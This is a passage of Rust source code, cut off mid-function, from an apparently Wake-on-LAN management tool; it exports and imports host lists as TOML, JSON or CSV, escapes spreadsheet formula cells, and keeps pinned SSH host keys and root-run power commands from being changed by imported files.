//! Export and import of hosts (and optionally settings) as TOML, JSON or CSV.
//!
//! * TOML / JSON use the `config.toml` structure (`schema_version`, optional `settings`,
//!   `hosts`); unknown host keys are carried along.
//! * CSV has one row per host with the columns [`CSV_COLUMNS`] (lists separated by `;`).
//!   Tab-separated input (`.tsv`, or a header line with tabs and no commas) is read the same
//!   way.
//!   Export writes UTF-8 with a BOM (Excel). Import accepts UTF-8 (BOM optional) and falls
//!   back to Shift_JIS (Windows-31J, what Japanese Excel saves) when the bytes are not UTF-8.
//!   Cells that a spreadsheet would run as a formula (`=`, `+`, `-`, `@`, tab, CR first) are
//!   exported with a leading `'`, which import removes again.
//! * Imported names, groups and notes lose control characters (like editor input), and
//!   records whose unknown keys are nested more than [`MAX_NESTING`] levels are refused.
//! * Import matches incoming hosts to existing ones by id, then by name (width-folded,
//!   case-insensitive). [`ImportMode::Merge`] updates / adds; [`ImportMode::Replace`] makes the
//!   host list exactly the imported one (keeping ids of matched hosts).
//! * Remote management (v0.2.0) is exported and imported without secrets (CSV: the
//!   `remote_*` / `ssh_*` columns, without `reboot_command` / `shutdown_command` and unknown
//!   remote keys; TOML / JSON: the whole table).
//! * A host whose `remote` table comes from a newer version (`kind` / `sudo` word this build
//!   does not know, e.g. `kind = "ipmi"`; [`Host::unsupported_remote`]) is treated like
//!   `config.toml` loading treats it. TOML / JSON: exported as it is; an imported record with
//!   such a table is not refused: the host is not managed here, the table is kept as it is
//!   (written back on save, exported again) and [`ImportData::warnings`] /
//!   [`ImportSummary::warnings`] say so; on a matched host it replaces the host's table like
//!   any `remote` key. CSV cannot carry such a table: export writes empty remote cells (the
//!   host is not managed by this version), and an empty `remote_kind` on a matched host keeps
//!   its table (export → import changes nothing), while a known kind replaces it; a new host
//!   imported from CSV has no table. A mistyped or unknown `remote_kind` / `ssh_sudo` cell
//!   stays a `Malformed` record (a spreadsheet typo must not silently unmanage a host).
//! * Stored passwords stay bound to the kind, account, management address and SSH port they
//!   were saved for ([`crate::secret`]): an import that points a matched host somewhere else
//!   (listed in [`ImportSummary::remote_changed`]) cannot make them travel there; they must be
//!   entered again. A matched host whose endpoint (kind, management address, SSH port) is
//!   unchanged keeps its locally pinned SSH host key, whatever the file says
//!   ([`ImportSummary::host_keys_kept`] when the file had another key). A managed host that
//!   the import points to another endpoint gets no pinned key at all, neither the file's nor
//!   its old one: the next connection shows the new server's fingerprint to confirm
//!   ([`ImportSummary::host_keys_cleared`]; review R6). After **every**
//!   import (merge or replace), call [`crate::secret::forget_removed_hosts`] for the hosts
//!   that are gone. Never call `SecretStore::rebind` for imported changes.
//! * The SSH power command overrides (`reboot_command` / `shutdown_command`, run with root
//!   rights) of a host that is already here are never set or changed by an import: the host
//!   keeps its own ([`ImportSummary::commands_kept`] when the file had others). Added hosts
//!   bring theirs ([`ImportSummary::commands_imported`]); every restart / shutdown
//!   confirmation shows a custom command.
//! * An import never confirms the use of the current Windows sign-in for a host
//!   ([`crate::secret::SecretStore::confirm_sign_in`]): hosts it adds, or points to another
//!   management address, are not contacted automatically with it.
//! * Everything is pure: import into a clone of the config for a dry run, or inside
//!   [`crate::store::Store::update`] to save.

use std::fmt;
use std::path::Path;
use std::str::FromStr;

use serde::{Deserialize, Serialize};
use uuid::Uuid;

use crate::error::{Error, Field, FieldError, FieldIssue, Result};
use crate::model::{
    Config, Host, HostDraft, HostId, ProbeMethod, RemoteDraft, RemoteKind, SCHEMA_VERSION,
    Settings, SudoMode, check_field,
};
use crate::normalize;

/// File format.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Format {
    /// TOML (same layout as `config.toml`).
    Toml,
    /// JSON (same layout as `config.toml`).
    Json,
    /// CSV, one host per row.
    Csv,
}

impl Format {
    /// `"toml"` / `"json"` / `"csv"` (also the file extension).
    pub const fn as_str(self) -> &'static str {
        match self {
            Format::Toml => "toml",
            Format::Json => "json",
            Format::Csv => "csv",
        }
    }

    /// Format from a file extension (case-insensitive).
    pub fn from_path(path: &Path) -> Option<Format> {
        let ext = path.extension()?.to_str()?.to_ascii_lowercase();
        match ext.as_str() {
            "toml" => Some(Format::Toml),
            "json" => Some(Format::Json),
            "csv" | "txt" | "tsv" => Some(Format::Csv),
            _ => None,
        }
    }

    /// Guesses the format of import data: explicit hint, then the path's extension, then the
    /// content (JSON object / array, TOML with `hosts` / `schema_version`, else CSV).
    pub fn detect(bytes: &[u8], hint: Option<Format>, path: Option<&Path>) -> Format {
        if let Some(f) = hint.or_else(|| path.and_then(Format::from_path)) {
            return f;
        }
        let text = String::from_utf8_lossy(strip_bom(bytes));
        let t = text.trim_start();
        if t.starts_with('{')
            || (t.starts_with('[') && serde_json::from_str::<serde_json::Value>(t).is_ok())
        {
            return Format::Json;
        }
        if let Ok(tbl) = toml::from_str::<toml::Table>(t)
            && (tbl.contains_key("hosts") || tbl.contains_key("schema_version"))
        {
            return Format::Toml;
        }
        Format::Csv
    }
}

impl fmt::Display for Format {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

impl FromStr for Format {
    type Err = String;
    fn from_str(s: &str) -> std::result::Result<Self, String> {
        match s.trim().to_ascii_lowercase().as_str() {
            "toml" => Ok(Format::Toml),
            "json" => Ok(Format::Json),
            "csv" => Ok(Format::Csv),
            _ => Err("expected one of: toml | json | csv".to_owned()),
        }
    }
}

/// CSV column order written by [`export`].
pub const CSV_COLUMNS: &[&str] = &[
    "id",
    "name",
    "mac",
    "address",
    "group",
    "notes",
    "port",
    "secureon",
    "targets",
    "broadcast",
    "interfaces",
    "probe",
    "tcp_ports",
    "remote_kind",
    "remote_user",
    "remote_address",
    "ssh_port",
    "ssh_key_file",
    "ssh_sudo",
    "ssh_host_key",
];

/// CSV columns of the remote-management table (v0.2.0). Secrets are never exported; the
/// pinned SSH host key is public data and is.
const CSV_REMOTE_COLUMNS: &[&str] = &[
    "remote_user",
    "remote_address",
    "ssh_port",
    "ssh_key_file",
    "ssh_sudo",
    "ssh_host_key",
];

/// Host keys of TOML / JSON records that overwrite a matched host when present.
const STRUCTURED_KEYS: &[&str] = &[
    "name",
    "mac",
    "address",
    "group",
    "notes",
    "port",
    "secureon",
    "targets",
    "broadcast",
    "interfaces",
    "probe",
    "tcp_ports",
    "remote",
];

fn strip_bom(b: &[u8]) -> &[u8] {
    b.strip_prefix(b"\xEF\xBB\xBF").unwrap_or(b)
}

/// First characters that make Excel and other spreadsheets read a CSV cell as a formula.
const FORMULA_START: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];

/// `true` when the cell, after any leading `'`, starts with a formula character.
fn looks_like_formula(cell: &str) -> bool {
    cell.trim_start_matches('\'')
        .starts_with(FORMULA_START.as_slice())
}

/// CSV export: a cell that a spreadsheet would run as a formula (`=1+1`, `@SUM(..)`,
/// `-2+3`, ...) gets a leading `'`, which spreadsheets show as text (CWE-1236). A cell that
/// already starts with `'` before such a character gets one more, so that
/// [`csv_unguard`] restores every value exactly.
fn csv_guard(cell: String) -> String {
    if looks_like_formula(&cell) {
        format!("'{cell}")
    } else {
        cell
    }
}

/// CSV import: undoes [`csv_guard`].
fn csv_unguard(cell: &str) -> &str {
    match cell.strip_prefix('\'') {
        Some(rest) if looks_like_formula(rest) => rest,
        _ => cell,
    }
}

#[derive(Serialize)]
struct ExportDoc<'a> {
    schema_version: u32,
    #[serde(skip_serializing_if = "Option::is_none")]
    settings: Option<&'a Settings>,
    hosts: Vec<&'a Host>,
}

/// Export options.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExportOptions {
    /// Output format.
    pub format: Format,
    /// Also write `[settings]` (TOML / JSON only; ignored for CSV).
    pub include_settings: bool,
}

/// Serializes `hosts` (and optionally `settings`). CSV output starts with a UTF-8 BOM.
/// Note that SecureOn passwords are exported in plain text. Remote management settings are
/// exported (TOML / JSON: the whole `remote` table incl. the pinned SSH host key; CSV: the
/// `remote_*` / `ssh_*` columns); passwords and passphrases never are (they live in
/// Credential Manager, see [`crate::secret`]).
pub fn export_hosts(
    hosts: &[&Host],
    settings: Option<&Settings>,
    format: Format,
) -> Result<Vec<u8>> {
    let doc = ExportDoc {
        schema_version: SCHEMA_VERSION,
        settings,
        hosts: hosts.to_vec(),
    };
    match format {
        Format::Toml => {
            let body = toml::to_string(&doc).map_err(|e| Error::Serialize(e.to_string()))?;
            Ok(format!("# WoL Manager export\n{body}").into_bytes())
        }
        Format::Json => {
            let mut v =
                serde_json::to_vec_pretty(&doc).map_err(|e| Error::Serialize(e.to_string()))?;
            v.push(b'\n');
            Ok(v)
        }
        Format::Csv => {
            let mut w = csv::WriterBuilder::new()
                .terminator(csv::Terminator::CRLF)
                .from_writer(Vec::new());
            let ser = |e: csv::Error| Error::Serialize(e.to_string());
            w.write_record(CSV_COLUMNS).map_err(ser)?;
            for h in hosts {
                let d = HostDraft::from_host(h);
                let targets = h
                    .targets
                    .iter()
                    .map(ToString::to_string)
                    .collect::<Vec<_>>()
                    .join(";");
                let ports = h
                    .tcp_ports
                    .iter()
                    .map(u16::to_string)
                    .collect::<Vec<_>>()
                    .join(";");
                w.write_record(
                    [
                        h.id.to_string(),
                        d.name,
                        d.mac,
                        d.address,
                        d.group,
                        d.notes,
                        d.port,
                        d.secureon,
                        targets,
                        h.broadcast.to_string(),
                        h.interfaces.join(";"),
                        h.probe.map(|p| p.to_string()).unwrap_or_default(),
                        ports,
                        d.remote
                            .kind
                            .map(|k| k.as_str().to_owned())
                            .unwrap_or_default(),
                        d.remote.user,
                        d.remote.address,
                        d.remote.port,
                        d.remote.key_file,
                        // SSH only: a Windows row with a sudo cell would keep "remote cells"
                        // around when the kind is cleared in a spreadsheet.
                        if d.remote.kind == Some(RemoteKind::Ssh) {
                            d.remote.sudo.as_str().to_owned()
                        } else {
                            String::new()
                        },
                        d.remote.host_key,
                    ]
                    .map(csv_guard),
                )
                .map_err(ser)?;
            }
            let body = w
                .into_inner()
                .map_err(|e| Error::Serialize(e.to_string()))?;
            let mut out = b"\xEF\xBB\xBF".to_vec();
            out.extend(body);
            Ok(out)
        }
    }
}

/// Exports every host of `cfg`.
pub fn export(cfg: &Config, opts: &ExportOptions) -> Result<Vec<u8>> {
    let hosts: Vec<&Host> = cfg.hosts.iter().collect();
    let settings = (opts.include_settings && opts.format != Format::Csv).then_some(&cfg.settings);
    export_hosts(&hosts, settings, opts.format)
}

/// How imported hosts are combined with the existing ones.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Default, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ImportMode {
    /// Update matching hosts, add the others, keep hosts not in the file.
    #[default]
    Merge,
    /// The host list becomes exactly the imported hosts.
    Replace,
}

/// Import options.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct ImportOptions {
    /// Merge or replace.
    pub mode: ImportMode,
    /// Force a format instead of detecting it.
    pub format: Option<Format>,
    /// Skip invalid records (listed in the summary) instead of failing.
    pub skip_invalid: bool,
    /// Also replace `[settings]` when the file has them (TOML / JSON).
    pub include_settings: bool,
}

/// One parsed record.
#[derive(Debug, Clone, PartialEq)]
pub struct ImportRecord {
    /// Where it came from (`row 3`, `hosts[2]`).
    pub location: String,
    /// The host, or why it is invalid.
    pub host: std::result::Result<Host, RecordError>,
    /// The record carried a usable id.
    pub had_id: bool,
    /// Fields present in the record (CSV: names from [`CSV_COLUMNS`] without `id`; TOML / JSON:
    /// the host keys, `remote` for the whole remote table). When the
    /// record matches an existing host, only these fields overwrite it.
    pub present: Vec<&'static str>,
}

/// Maps a key to its [`CSV_COLUMNS`] name (without `id`).
fn field_key(k: &str) -> Option<&'static str> {
    STRUCTURED_KEYS.iter().copied().find(|c| *c == k)
}

/// What [`keep_local_host_key`] did.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum HostKeyMerge {
    /// Nothing to report.
    Unchanged,
    /// The local pin was kept although the file had another key for the same server.
    KeptLocal,
    /// The endpoint changed: the key (the file's or the old one) was removed.
    Cleared,
}

/// Settles the pinned SSH host key of the merged host `h` of the managed host `existing`:
/// * same management endpoint (kind, management address, SSH port): `existing`'s pinned key
///   is kept, a file must not replace a key this PC trusts (which protects the stored
///   password) for the same server;
/// * another endpoint: no key at all. The file's key would be trusted without the user ever
///   seeing its fingerprint, and the old one belongs to another server (review R6).
fn keep_local_host_key(existing: &Host, h: &mut Host) -> HostKeyMerge {
    // Kind, management address (none = none) and SSH port.
    let endpoint = crate::secret::endpoint;
    if endpoint(existing).is_none() {
        return HostKeyMerge::Unchanged;
    }
    if endpoint(existing) != endpoint(h) {
        return match h.remote.as_mut().and_then(|r| r.host_key.take()) {
            Some(_) => HostKeyMerge::Cleared,
            None => HostKeyMerge::Unchanged,
        };
    }
    let Some(pinned) = existing.remote.as_ref().and_then(|r| r.host_key()) else {
        return HostKeyMerge::Unchanged;
    };
    let Some(r) = h.remote.as_mut() else {
        return HostKeyMerge::Unchanged;
    };
    let same_key = |a: &str, b: &str| match (
        crate::model::check_host_key(a),
        crate::model::check_host_key(b),
    ) {
        (Ok(x), Ok(y)) => x == y,
        _ => a.trim() == b.trim(),
    };
    let differs = r.host_key().is_some_and(|k| !same_key(k, pinned));
    r.host_key = existing.remote.as_ref().and_then(|x| x.host_key.clone());
    if differs {
        HostKeyMerge::KeptLocal
    } else {
        HostKeyMerge::Unchanged
    }
}

/// A power command override as it counts: trimmed, `None` when unset or blank.
fn command_of(c: &Option<String>) -> Option<&str> {
    c.as_deref().map(str::trim).filter(|c| !c.is_empty())
}

/// Keeps `existing`'s SSH `reboot_command` / `shutdown_command` on the merged host `h`: an
/// import never sets or changes them on a host that is already here (they run with root rights
/// on the next restart / shutdown, with the stored sudo password, like the pinned host key
/// that protects that password). Returns `true` when the file had another (non-empty) command.
fn keep_local_commands(existing: &Host, h: &mut Host) -> bool {
    let Some(r) = h.remote.as_mut() else {
        return false;
    };
    let local = existing.remote.as_ref();
    let (reboot, shutdown) = (
        local.and_then(|x| x.reboot_command.clone()),
        local.and_then(|x| x.shutdown_command.clone()),
    );
    let attempted = |file: &Option<String>, here: &Option<String>| {
        command_of(file).is_some_and(|f| Some(f) != command_of(here))
    };
    let differs =
        attempted(&r.reboot_command, &reboot) || attempted(&r.shutdown_command, &shutdown);
    r.reboot_command = reboot;
    r.shutdown_command = shutdown;
    differs
}

/// `true` when an added host brings SSH power command overrides (shown in the preview; every
/// restart / shutdown confirmation shows them too).
fn has_custom_commands(h: &Host) -> bool {
    h.remote.as_ref().is_some_and(|r| {
        r.kind == RemoteKind::Ssh
            && (command_of(&r.reboot_command).is_some()
                || command_of(&r.shutdown_command).is_some())
    })
}

/// Copies the `present` fields (and extra keys) of `incoming` onto `existing`.
fn overlay(existing: &Host, incoming: &Host, present: &[&str]) -> Host {
    let mut h = existing.clone();
    for p in present {
        match *p {
            "name" => h.name = incoming.name.clone(),
            "mac" => h.mac = incoming.mac,
            "address" => h.address = incoming.address.clone(),
            "group" => h.group = incoming.group.clone(),
            "notes" => h.notes = incoming.notes.clone(),
            "port" => h.port = incoming.port,
            "secureon" => h.secureon = incoming.secureon,
            "targets" => h.targets = incoming.targets.clone(),
            "broadcast" => h.broadcast = incoming.broadcast,
            "interfaces" => h.interfaces = incoming.interfaces.clone(),
            "probe" => h.probe = incoming.probe,
            "tcp_ports" => h.tcp_ports = incoming.tcp_ports.clone(),
            "remote" => {
                // The file's table replaces the host's as a whole, also a newer version's
                // table kept in `extra` (the incoming one, if any, comes back with `extra`).
                h.remote = incoming.remote.clone();
                h.extra.remove("remote");
            }
            _ => {}
        }
    }
    overlay_remote_columns(&mut h, incoming, present);
    for (k, v) in &incoming.extra {
        h.extra.insert(k.clone(), v.clone());
    }
    h
}

/// CSV: the remote columns overwrite a matched host only when the file has a `remote_kind`
/// column. An empty `remote_kind` removes remote management; otherwise the kind and the
/// present remote columns are applied to the host's table (created when missing, keeping
/// fields the file has no column for).
///
/// A newer version's table the host keeps ([`Host::unsupported_remote`]) is exported with
/// empty remote cells (the host is not managed by this version), so an empty `remote_kind`
/// leaves it alone (export → import changes nothing); a known kind replaces it.
fn overlay_remote_columns(h: &mut Host, incoming: &Host, present: &[&str]) {
    if !present.contains(&"remote_kind") {
        return;
    }
    let Some(inc) = &incoming.remote else {
        h.remote = None;
        return;
    };
    h.extra.remove("remote");
    let Some(r) = h.remote.as_mut() else {
        h.remote = Some(inc.clone());
        return;
    };
    r.kind = inc.kind;
    for p in present {
        match *p {
            "remote_user" => r.user = inc.user.clone(),
            "remote_address" => r.address = inc.address.clone(),
            "ssh_port" => r.port = inc.port,
            "ssh_key_file" => r.key_file = inc.key_file.clone(),
            "ssh_sudo" => r.sudo = inc.sudo,
            "ssh_host_key" => r.host_key = inc.host_key.clone(),
            _ => {}
        }
    }
}

/// Why a record is invalid.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum RecordError {
    /// Field validation failed.
    Fields {
        /// Name as given, if any.
        name: Option<String>,
        /// Problems.
        errors: Vec<FieldError>,
    },
    /// The record could not be decoded (English message).
    Malformed {
        /// Message.
        message: String,
    },
}

impl fmt::Display for RecordError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            RecordError::Fields { name, errors } => {
                if let Some(n) = name {
                    write!(f, "{n:?}: ")?;
                }
                let list: Vec<String> = errors.iter().map(ToString::to_string).collect();
                f.write_str(&list.join(", "))
            }
            RecordError::Malformed { message } => f.write_str(message),
        }
    }
}

/// Parsed import file.
#[derive(Debug, Clone, PartialEq)]
pub struct ImportData {
    /// Detected / forced format.
    pub format: Format,
    /// Records in file order.
    pub records: Vec<ImportRecord>,
    /// `[settings]`, if the file has them.
    pub settings: Option<Settings>,
    /// Notes such as a newer `schema_version` or the Shift_JIS fallback.
    pub warnings: Vec<String>,
}

/// A record that was not imported.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ImportSkip {
    /// Where.
    pub location: String,
    /// Why.
    pub error: RecordError,
}

/// What an import did (or would do, on a clone).
#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize)]
pub struct ImportSummary {
    /// Names of added hosts.
    pub added: Vec<String>,
    /// Names of changed hosts.
    pub updated: Vec<String>,
    /// Names of matched hosts that were already identical.
    pub unchanged: Vec<String>,
    /// Records not imported.
    pub skipped: Vec<ImportSkip>,
    /// Names of hosts removed ([`ImportMode::Replace`]).
    pub removed: Vec<String>,
    /// `[settings]` were replaced.
    pub settings_replaced: bool,
    /// Notes from parsing.
    pub warnings: Vec<String>,
    /// Names of matched hosts whose remote-management target changed (kind, account,
    /// management address or SSH port). Their stored passwords are not used for the new target
    /// ([`crate::secret::SecretState::Stale`]): show this in the preview ("saved passwords of
    /// these hosts must be entered again").
    pub remote_changed: Vec<String>,
    /// Names of matched hosts that kept their pinned SSH host key although the file has
    /// another one for the same server (show in the preview; the user can "forget" the key
    /// if the server really changed).
    pub host_keys_kept: Vec<String>,
    /// Names of matched managed hosts that the import points to another endpoint (kind,
    /// management address, SSH port) and that had a host key (in the file or here): no key is
    /// pinned for the new server; the next connection asks to confirm its fingerprint (show in
    /// the preview).
    pub host_keys_cleared: Vec<String>,
    /// Names of matched hosts for which the file had other SSH restart / shutdown command
    /// overrides (`reboot_command` / `shutdown_command`). An import never sets or changes
    /// them on a host that is already here (they run with root rights); this PC's values are
    /// kept. Show in the preview ("set them with `wolm remote set` if they are wanted").
    pub commands_kept: Vec<String>,
    /// Names of added hosts that bring SSH restart / shutdown command overrides. They are
    /// imported (the host is new, nothing ran with it yet) and every restart / shutdown
    /// confirmation shows them (CLI and GUI); show them in the preview too.
    pub commands_imported: Vec<String>,
}

/// Decodes CSV bytes: UTF-8 (BOM stripped) or, when invalid, Shift_JIS. Returns the text and
/// whether the fallback was used.
pub fn decode_csv_text(bytes: &[u8]) -> (String, bool) {
    let b = strip_bom(bytes);
    match std::str::from_utf8(b) {
        Ok(s) => (s.to_owned(), false),
        Err(_) => {
            let (text, _had_errors) = encoding_rs::SHIFT_JIS.decode_without_bom_handling(b);
            (text.into_owned(), true)
        }
    }
}

/// Deepest nesting of tables / arrays accepted in an imported host or `[settings]` (unknown
/// keys are carried along as they are). `config.toml` must stay readable: the TOML parser
/// gives up at a nesting depth far below what JSON allows.
pub const MAX_NESTING: usize = 20;

fn nesting(v: &toml::Value) -> usize {
    match v {
        toml::Value::Array(a) => 1 + a.iter().map(nesting).max().unwrap_or(0),
        toml::Value::Table(t) => 1 + t.values().map(nesting).max().unwrap_or(0),
        _ => 0,
    }
}

/// `true` when `v` serializes to tables / arrays nested deeper than [`MAX_NESTING`].
fn too_deep<T: Serialize>(v: &T) -> bool {
    toml::Value::try_from(v).is_ok_and(|v| nesting(&v) > MAX_NESTING)
}

fn too_deep_message() -> String {
    format!("unknown keys are nested more than {MAX_NESTING} levels deep")
}

fn validate_host(h: &Host) -> std::result::Result<(), RecordError> {
    if too_deep(h) {
        return Err(RecordError::Malformed {
            message: too_deep_message(),
        });
    }
    let mut errors = Vec::new();
    if let Err(i) = check_field(Field::Name, &h.name) {
        errors.push(FieldError::new(Field::Name, i));
    }
    if !h.mac.is_usable() {
        errors.push(FieldError::new(Field::Mac, FieldIssue::MacNotUnicast));
    }
    if h.port == Some(0) {
        errors.push(FieldError::new(Field::Port, FieldIssue::InvalidPort));
    }
    if let Err(i) = crate::addr::check_port_list(&h.tcp_ports) {
        errors.push(FieldError::new(Field::TcpPorts, i));
    }
    if let Some(r) = &h.remote {
        errors.extend(r.check());
    }
    if errors.is_empty() {
        Ok(())
    } else {
        Err(RecordError::Fields {
            name: Some(h.name.clone()),
            errors,
        })
    }
}

fn record_from_host(location: String, mut h: Host, present: Vec<&'static str>) -> ImportRecord {
    // Like the editor: no control characters (terminal escapes) in names, groups and notes.
    h.name = normalize::clean_single_line(&h.name);
    h.group = h
        .group
        .as_deref()
        .map(normalize::clean_single_line)
        .filter(|g| !g.is_empty());
    h.notes = h
        .notes
        .as_deref()
        .map(normalize::clean_notes)
        .filter(|n| !n.trim().is_empty());
    let had_id = !h.id.is_nil();
    let host = validate_host(&h).map(|()| h);
    ImportRecord {
        location,
        host,
        had_id,
        present,
    }
}

type RawHost = (String, std::result::Result<Host, String>, Vec<&'static str>);

/// A TOML / JSON record whose `remote` table carries a newer version's `kind` / `sudo` word
/// (e.g. `kind = "ipmi"`, what TOML / JSON exports of such a host contain) is read like
/// `config.toml` reads it (review m9): the host without that table (`rest`), the table kept
/// as it is in `extra` ([`Host::unsupported_remote`]), the host not managed here. `None` when
/// `remote` is not such a table or the rest of the record fails too.
fn host_keeping_unsupported_remote(
    remote: Option<toml::Value>,
    rest: impl FnOnce() -> Option<Host>,
) -> Option<Host> {
    let remote = remote?;
    remote
        .as_table()
        .and_then(crate::model::unsupported_remote_value)?;
    let mut h = rest()?;
    h.extra.insert("remote".to_owned(), remote);
    Some(h)
}

fn host_from_toml(v: &toml::Value) -> std::result::Result<Host, String> {
    Host::deserialize(v.clone())
        .map_err(|e| e.to_string())
        .or_else(|e| {
            let mut t = v.as_table().cloned().unwrap_or_default();
            let remote = t.remove("remote");
            host_keeping_unsupported_remote(remote, || {
                Host::deserialize(toml::Value::Table(t)).ok()
            })
            .ok_or(e)
        })
}

fn host_from_json(item: &serde_json::Value) -> std::result::Result<Host, String> {
    Host::deserialize(item)
        .map_err(|e| e.to_string())
        .or_else(|e| {
            let mut o = item.as_object().cloned().unwrap_or_default();
            let remote = o
                .remove("remote")
                .and_then(|r| toml::Value::try_from(r).ok());
            host_keeping_unsupported_remote(remote, || {
                Host::deserialize(&serde_json::Value::Object(o)).ok()
            })
            .ok_or(e)
        })
}

fn parse_structured(
    format: Format,
    hosts: Vec<RawHost>,
    settings: Option<std::result::Result<Settings, String>>,
    schema: Option<i64>,
) -> Result<ImportData> {
    let mut warnings = Vec::new();
    if let Some(v) = schema
        && v > i64::from(SCHEMA_VERSION)
    {
        warnings.push(format!(
            "the file has schema_version {v}; newer fields are kept as unknown keys"
        ));
    }
    let settings = match settings {
        None => None,
        Some(Ok(s)) if too_deep(&s) => {
            warnings.push(format!("settings ignored: {}", too_deep_message()));
            None
        }
        Some(Ok(s)) => Some(s),
        Some(Err(e)) => {
            warnings.push(format!("settings ignored: {e}"));
            None
        }
    };
    for (loc, h, _) in &hosts {
        if let Ok(h) = h
            && let Some(t) = h.unsupported_remote()
        {
            let value = crate::model::unsupported_remote_value(t).unwrap_or_default();
            warnings.push(format!(
                "{loc}: the remote management settings of {:?} ({value}) are not supported by this version; the host is not managed here and the settings are kept as they are",
                h.name
            ));
        }
    }
    let records = hosts
        .into_iter()
        .map(|(loc, r, present)| match r {
            Ok(h) => record_from_host(loc, h, present),
            Err(message) => ImportRecord {
                location: loc,
                host: Err(RecordError::Malformed { message }),
                had_id: false,
                present,
            },
        })
        .collect();
    Ok(ImportData {
        format,
        records,
        settings,
        warnings,
    })
}

fn parse_toml(text: &str, path: Option<&Path>) -> Result<ImportData> {
    let tbl: toml::Table = toml::from_str(text).map_err(|e| {
        let (line, column) = e
            .span()
            .map(|s| crate::model::line_col(text, s.start))
            .map(|(l, c)| (Some(l), Some(c)))
            .unwrap_or((None, None));
        Error::ConfigParse {
            path: path.map(Path::to_path_buf),
            line,
            column,
            message: e.message().to_owned(),
        }
    })?;
    let hosts = match tbl.get("hosts") {
        Some(toml::Value::Array(a)) => a
            .iter()
            .enumerate()
            .map(|(i, v)| {
                let present = v
                    .as_table()
                    .map(|t| t.keys().filter_map(|k| field_key(k)).collect())
                    .unwrap_or_default();
                (format!("hosts[{i}]"), host_from_toml(v), present)
            })
            .collect(),
        Some(_) => {
            return Err(Error::Import {
                location: Some("hosts".into()),
                message: "`hosts` must be an array of tables".into(),
            });
        }
        None => Vec::new(),
    };
    let settings = tbl
        .get("settings")
        .map(|v| Settings::deserialize(v.clone()).map_err(|e| e.to_string()));
    let schema = tbl.get("schema_version").and_then(toml::Value::as_integer);
    parse_structured(Format::Toml, hosts, settings, schema)
}

fn parse_json(text: &str, path: Option<&Path>) -> Result<ImportData> {
    let v: serde_json::Value = serde_json::from_str(text).map_err(|e| Error::ConfigParse {
        path: path.map(Path::to_path_buf),
        line: Some(e.line()),
        column: Some(e.column()),
        message: e.to_string(),
    })?;
    let (items, settings, schema) = match &v {
        serde_json::Value::Array(a) => (a.clone(), None, None),
        serde_json::Value::Object(o) => (
            match o.get("hosts") {
                Some(serde_json::Value::Array(a)) => a.clone(),
                Some(_) => {
                    return Err(Error::Import {
                        location: Some("hosts".into()),
                        message: "`hosts` must be an array".into(),
                    });
                }
                None => Vec::new(),
            },
            o.get("settings").cloned(),
            o.get("schema_version").and_then(serde_json::Value::as_i64),
        ),
        _ => {
            return Err(Error::Import {
                location: None,
                message: "expected a JSON object or array".into(),
            });
        }
    };
    let hosts = items
        .into_iter()
        .enumerate()
        .map(|(i, item)| {
            let present = item
                .as_object()
                .map(|o| o.keys().filter_map(|k| field_key(k)).collect())
                .unwrap_or_default();
            (format!("hosts[{i}]"), host_from_json(&item), present)
        })
        .collect();
    let settings =
        settings.map(|s| serde_json::from_value::<Settings>(s).map_err(|e| e.to_string()));
    parse_structured(Format::Json, hosts, settings, schema)
}

fn csv_column(header: &str) -> Option<&'static str> {
    let h = normalize::name_key(header).replace([' ', '_', '-'], "");
    Some(match h.as_str() {
        "id" => "id",
        "name" | "hostname" | "host" | "名前" | "ホスト名" => "name",
        "mac" | "macaddress" | "macアドレス" => "mac",
        "address" | "ip" | "ipaddress" | "ipv4" | "アドレス" | "ipアドレス" => "address",
        "group" | "グループ" => "group",
        "notes" | "note" | "memo" | "comment" | "メモ" | "備考" => "notes",
        "port" | "ポート" => "port",
        "secureon" | "password" => "secureon",
        "targets" | "target" | "送信先" => "targets",
        "broadcast" => "broadcast",
        "interfaces" | "interface" => "interfaces",
        "probe" => "probe",
        "tcpports" | "tcpport" => "tcp_ports",
        // Remote management (v0.2.0): only the explicit column names (and specific Japanese
        // ones). Generic headers of inventory sheets (`User`, `ユーザー名`, `Remote`, `sudo`,
        // `Management address` of a BMC...) stay unknown columns, as in v0.1.
        "remotekind" => "remote_kind",
        "remoteuser" => "remote_user",
        "remoteaddress" | "管理用アドレス" => "remote_address",
        "sshport" => "ssh_port",
        "sshkeyfile" | "鍵ファイル" => "ssh_key_file",
        "sshsudo" => "ssh_sudo",
        "sshhostkey" | "ホスト鍵" => "ssh_host_key",
        _ => return None,
    })
}

fn parse_bool_cell(s: &str) -> Option<bool> {
    match normalize::normalize_input(s)
        .trim()
        .to_ascii_lowercase()
        .as_str()
    {
        "" => None,
        "true" | "1" | "yes" | "on" | "はい" => Some(true),
        "false" | "0" | "no" | "off" | "いいえ" => Some(false),
        _ => None,
    }
}

/// Field delimiter of CSV-family input: tab for `.tsv` files, and for text whose header line
/// has tabs but no commas (tab-separated `.txt`, a paste from Excel); comma otherwise.
fn csv_delimiter(text: &str, path: Option<&Path>) -> u8 {
    let is_tsv = path
        .and_then(Path::extension)
        .and_then(|e| e.to_str())
        .is_some_and(|e| e.eq_ignore_ascii_case("tsv"));
    let header = text.lines().find(|l| !l.trim().is_empty()).unwrap_or("");
    if is_tsv || (header.contains('\t') && !header.contains(',')) {
        b'\t'
    } else {
        b','
    }
}

/// Fills the remote draft of a CSV row (only called when the file has a `remote_kind`
/// column). An empty kind means "not managed": leftover remote cells are ignored and returned
/// as a warning (e.g. a kind cleared in a spreadsheet to remove management). A bad kind or
/// sudo value is an error.
fn remote_draft_from_csv(
    get: &dyn Fn(&str) -> String,
    remote: &mut RemoteDraft,
) -> std::result::Result<Option<String>, String> {
